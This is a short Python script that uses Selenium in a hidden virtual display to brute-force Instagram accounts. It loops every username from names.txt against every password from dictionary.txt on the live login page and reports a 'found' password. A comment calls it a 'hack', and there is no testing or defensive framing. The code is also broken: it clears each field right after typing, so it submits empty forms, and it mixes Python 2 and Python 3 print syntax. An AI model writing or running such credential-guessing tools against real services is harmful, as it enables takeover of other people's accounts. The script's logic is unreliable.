#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pyvirtualdisplay import Display
import re
import requests
import time
print "rowly  the king"
def guess_password(driver):
    
    with open("names.txt", "r") as f:
            names = f.read()

    print(names)
    names = names.split("\n")
    print(names)

    usernames = []

    for name in names:
        usernames.append(name)

    with open("dictionary.txt") as f:
        passwords = f.read()

    passwords = passwords.split("\n")
    print(passwords)

    for user in usernames:
        for password in passwords:

            print("Trying Username: {} with Password: {}".format(user, password))

            elem = driver.find_element_by_name("username")
            elem.send_keys(user)
            elem.clear()
            elem = driver.find_element_by_name("password")
            elem.send_keys(password)
            elem.clear()
            elem.send_keys(Keys.RETURN)

            src = driver.page_source

            login_err_found = re.search(r'src="/static/bundles/en_US_Commons.js/d89f0804d8ba.js" ' , src)
            if login_err_found is None:
                print("Found the password!  Username: {} with Password: {}".format(user, password))
                return src

    return "Not found"


def brute_force_login(driver):

    driver.get("https://www.instagram.com/accounts/login/")
    time.sleep(7)
    page_text = guess_password(driver)

    print(page_text)


    print(driver.page_source)



if __name__ == '__main__':
    
    display = Display(visible=0, size=(1024, 768))
    display.start()

    driver = webdriver.Firefox()

    ## Uncomment one of the functions below to run a specific hack
    brute_force_login(driver)
   

    driver.close()
    display.stop()
